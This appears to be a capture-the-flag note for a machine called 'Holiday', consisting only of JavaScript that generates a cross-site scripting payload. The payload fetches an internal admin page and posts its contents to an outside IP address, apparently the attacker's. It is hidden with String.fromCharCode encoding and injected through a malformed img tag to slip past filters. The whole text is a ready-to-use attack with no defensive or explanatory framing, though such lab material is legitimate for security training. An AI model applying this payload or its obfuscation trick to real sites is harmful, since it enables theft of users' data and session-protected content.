## Holiday

```javascript
var url = 'http://localhost:8000/vac/8dd841ff-3f44-4f2b-9324-9a833e2c6b65';
var str = `$.ajax({method:'GET',url:'${url}',success:function(data){$.post('http://10.10.16.65',data)}})`;
console.log(str);
result = "";
for (var i = 0; i < str.length; i++) {
  result += str.charCodeAt(i) + ',';
}
result = result.substr(0, result.length - 1);
console.log(result);
var payload = `<img src="x/><script>eval(String.fromCharCode(${result}));</script>">`;
console.log(payload);
```
